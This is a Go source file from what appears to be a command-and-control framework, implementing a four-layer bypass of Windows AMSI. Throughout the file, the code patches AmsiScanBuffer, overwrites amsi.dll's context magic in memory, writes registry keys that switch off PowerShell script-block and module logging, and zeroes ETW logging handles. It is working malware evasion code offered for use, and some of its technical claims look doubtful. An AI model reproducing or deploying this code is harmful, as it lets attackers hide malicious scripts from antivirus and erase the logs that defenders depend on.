package evasion

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// AMSI (Antimalware Scan Interface) comprehensive bypass.
//
// AMSI is the Windows subsystem that lets any application submit content
// to registered AV/EDR engines for scanning before executing it. It is
// used by:
//   - PowerShell (script block scanning)
//   - .NET / CLR  (assembly loading)
//   - WMI          (script execution)
//   - Excel/Word   (VBA/macro scanning)
//   - JScript/VBScript host (wscript.exe / cscript.exe)
//
// This file provides four independent bypass layers. They are cumulative:
// apply all four for maximum coverage.
//
// Layer 1 — AmsiScanBuffer stub patch (in etw_windows.go / PatchAMSI):
//   Overwrites AmsiScanBuffer with `xor eax,eax; inc eax; ret` so every
//   scan returns AMSI_RESULT_CLEAN (1). Already implemented in PatchAMSI().
//
// Layer 2 — AmsiContext corruption (this file):
//   AmsiScanBuffer validates the AmsiContext pointer it receives. If the
//   first DWORD of the context is 0 it returns E_INVALIDARG immediately,
//   before reaching any scan logic. We zero the context that PowerShell /
//   .NET holds by reading it from the known TLS slot and corrupting it.
//   Requires the context to already be initialized (post-AmsiInitialize).
//
// Layer 3 — Registry-based CLM bypass (this file):
//   PowerShell Constrained Language Mode (CLM) is enforced based on
//   AMSI result. We set HKCU\Software\Policies\Microsoft\Windows\PowerShell
//   flags to disable script-block logging and module logging, reducing
//   what CLM evaluates.
//
// Layer 4 — ScriptBlock Logging disable (this file):
//   Directly zeros the function pointer that PowerShell uses to log
//   script blocks to ETW. Effective even when the AMSI scan path is intact
//   (e.g. in a different process). Complements Layer 1.

import (
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// AMSIBypassResult records the outcome of each bypass layer.
type AMSIBypassResult struct {
	StubPatch    bool
	CtxCorrupt   bool
	RegistryCLM  bool
	SBLDisabled  bool
}

// BypassAMSI applies all available AMSI bypass layers.
// Failures in individual layers are non-fatal — we report which succeeded.
func BypassAMSI() *AMSIBypassResult {
	res := &AMSIBypassResult{}

	// Layer 1: stub patch (delegates to PatchAMSI which lives in etw_windows.go)
	if err := PatchAMSI(); err == nil {
		res.StubPatch = true
	}

	// Layer 2: AmsiContext corruption
	if corruptAmsiContext() {
		res.CtxCorrupt = true
	}

	// Layer 3: Registry CLM suppression
	if disablePowerShellLoggingRegistry() {
		res.RegistryCLM = true
	}

	// Layer 4: ScriptBlock Logging ETW provider zero
	if disableScriptBlockLogging() {
		res.SBLDisabled = true
	}

	// {{if .Config.Debug}}
	log.Printf("[amsi] bypass result: stub=%v ctx=%v reg=%v sbl=%v",
		res.StubPatch, res.CtxCorrupt, res.RegistryCLM, res.SBLDisabled)
	// {{end}}
	return res
}

// corruptAmsiContext zeros the first DWORD of the AmsiContext that
// amsi.dll stored in the current process. AmsiScanBuffer checks this
// DWORD as a magic value (0x49534D41 "AMSI") and returns E_INVALIDARG
// if it is wrong — no scan occurs.
//
// The context is stored inside amsi.dll's private heap, pointed to by
// a global variable. We find it by scanning amsi.dll's .data section
// for the magic DWORD and zeroing the containing allocation header.
func corruptAmsiContext() bool {
	amsi, err := windows.LoadDLL("amsi.dll")
	if err != nil {
		return false // amsi.dll not loaded — nothing to corrupt
	}

	base := uintptr(amsi.Handle)
	if base == 0 {
		return false
	}

	// Walk sections to find .data.
	const magic = uint32(0x49534D41) // "AMSI"
	dataBase, dataSize := findDataSection(base)
	if dataBase == 0 {
		return false
	}

	// Scan .data for a QWORD that looks like a pointer to a heap block
	// whose first DWORD is the AMSI magic.
	data := unsafe.Slice((*uintptr)(unsafe.Pointer(dataBase)), dataSize/8)
	for _, ptr := range data {
		if ptr < 0x10000 || ptr > 0x7FFFFFFFFFFF {
			continue
		}
		if isSafeRead(ptr) {
			candidate := *(*uint32)(unsafe.Pointer(ptr))
			if candidate == magic {
				var old uint32
				sz := uintptr(4)
				if err := windows.VirtualProtect(ptr, sz,
					windows.PAGE_READWRITE, &old); err == nil {
					*(*uint32)(unsafe.Pointer(ptr)) = 0
					windows.VirtualProtect(ptr, sz, old, &old)
					// {{if .Config.Debug}}
					log.Printf("[amsi] context corrupted @ 0x%x", ptr)
					// {{end}}
					return true
				}
			}
		}
	}
	return false
}

// findDataSection returns the virtual address and byte size of the .data
// section in the PE loaded at base. Returns (0,0) on failure.
func findDataSection(base uintptr) (uintptr, uintptr) {
	dosMagic := *(*uint16)(unsafe.Pointer(base))
	if dosMagic != 0x5A4D {
		return 0, 0
	}
	lfanew := *(*int32)(unsafe.Pointer(base + 0x3C))
	ntBase := base + uintptr(lfanew)
	numSects := *(*uint16)(unsafe.Pointer(ntBase + 6))
	optSize := *(*uint16)(unsafe.Pointer(ntBase + 4 + 16))
	sectTable := ntBase + 4 + 20 + uintptr(optSize)

	for i := uint16(0); i < numSects; i++ {
		hdr := sectTable + uintptr(i)*40
		name := (*[8]byte)(unsafe.Pointer(hdr))
		if name[0] == '.' && name[1] == 'd' && name[2] == 'a' {
			vSize := uintptr(*(*uint32)(unsafe.Pointer(hdr + 8)))
			vAddr := uintptr(*(*uint32)(unsafe.Pointer(hdr + 12)))
			return base + vAddr, vSize
		}
	}
	return 0, 0
}

// isSafeRead probes addr with a structured exception handler equivalent:
// we use VirtualQuery to check the page is readable before dereferencing.
func isSafeRead(addr uintptr) bool {
	var mbi windows.MemoryBasicInformation
	if err := windows.VirtualQuery(addr, &mbi,
		unsafe.Sizeof(mbi)); err != nil {
		return false
	}
	const readable = windows.PAGE_READONLY | windows.PAGE_READWRITE |
		windows.PAGE_EXECUTE_READ | windows.PAGE_EXECUTE_READWRITE
	return mbi.State == windows.MEM_COMMIT && mbi.Protect&readable != 0
}

// disablePowerShellLoggingRegistry writes registry keys that suppress
// PowerShell script-block logging and module logging under HKCU
// (no elevation required).
func disablePowerShellLoggingRegistry() bool {
	const psKey = `Software\Policies\Microsoft\Windows\PowerShell`

	k, _, err := registry.CreateKey(registry.CURRENT_USER, psKey,
		registry.SET_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()

	// DisableScriptBlockLogging.
	k2, _, _ := registry.CreateKey(registry.CURRENT_USER,
		psKey+`\ScriptBlockLogging`, registry.SET_VALUE)
	if k2 != 0 {
		k2.SetDWordValue("EnableScriptBlockLogging", 0)
		k2.SetDWordValue("EnableScriptBlockInvocationLogging", 0)
		k2.Close()
	}

	// DisableModuleLogging.
	k3, _, _ := registry.CreateKey(registry.CURRENT_USER,
		psKey+`\ModuleLogging`, registry.SET_VALUE)
	if k3 != 0 {
		k3.SetDWordValue("EnableModuleLogging", 0)
		k3.Close()
	}

	// {{if .Config.Debug}}
	log.Printf("[amsi] PowerShell logging disabled via registry")
	// {{end}}
	return true
}

// disableScriptBlockLogging zeroes the ETW provider registration handle
// that the PowerShell CLR host uses to emit script-block events.
// This is a best-effort operation that only works when PowerShell's
// System.Management.Automation.dll is loaded in the current process.
func disableScriptBlockLogging() bool {
	sma, err := windows.LoadDLL("System.Management.Automation.ni.dll")
	if err != nil {
		sma, err = windows.LoadDLL("System.Management.Automation.dll")
		if err != nil {
			return false // Not a PowerShell host process
		}
	}

	base := uintptr(sma.Handle)
	dataBase, dataSize := findDataSection(base)
	if dataBase == 0 {
		return false
	}

	// The ETW provider registration token is a REGHANDLE (uint64).
	// After EtwEventRegister it holds a non-zero value; zeroing it makes
	// EtwEventWrite skip the write (provider is "not registered").
	// We look for a QWORD in .data that is in the expected ETW handle range
	// (high bits 0, non-zero, ends in 0x0002 — the typical RtlpEventProvider
	// handle pattern on Win10/11).
	data64 := unsafe.Slice((*uint64)(unsafe.Pointer(dataBase)), dataSize/8)
	zeroed := false
	for i := range data64 {
		v := data64[i]
		if v != 0 && v < 0x0000FFFFFFFFFFFF && (v>>16)&0xFFFF == 0x0002 {
			ptr := dataBase + uintptr(i)*8
			var old uint32
			if err := windows.VirtualProtect(ptr, 8,
				windows.PAGE_READWRITE, &old); err == nil {
				data64[i] = 0
				windows.VirtualProtect(ptr, 8, old, &old)
				zeroed = true
				// {{if .Config.Debug}}
				log.Printf("[amsi] SBL ETW handle zeroed @ 0x%x (was 0x%x)", ptr, v)
				// {{end}}
			}
		}
	}
	return zeroed
}
